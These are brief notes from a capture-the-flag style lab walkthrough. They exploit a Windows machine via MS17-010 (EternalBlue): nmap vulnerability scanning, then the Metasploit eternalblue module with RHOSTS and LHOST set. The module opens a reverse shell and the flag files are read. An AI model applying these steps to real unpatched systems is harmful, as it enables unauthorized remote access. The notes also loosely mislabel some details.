1.) Reconnaissance
  Run nmap
  NEW!: --script vuln scans for script vulnerabilities
  nmap shows there's a vulnerable script (ms17-010)
  Google searching shows that's the EternalBlue vulnerability that allows RCE
2.) Remote Access
  Open msfconsole and search ms17-010
  Select the one that says eternalblue and set the options
    set rhosts to the target ip, rport is fine by default
    SET LHOST TO VPN IP
  Settings should be fine at this point and run/exploit to run it
  Should have caught a reverse tcp shell at this point
  getuid to confirm we're in as root
  WINDOWS POWERSHELL COMMMANDS SIMILAR TO LINUX
  cd to \Users and then haris, navigate to desktop and cat user.txt
  navigate to \Users\Administrator\Desktop and cat root.txt
ggez
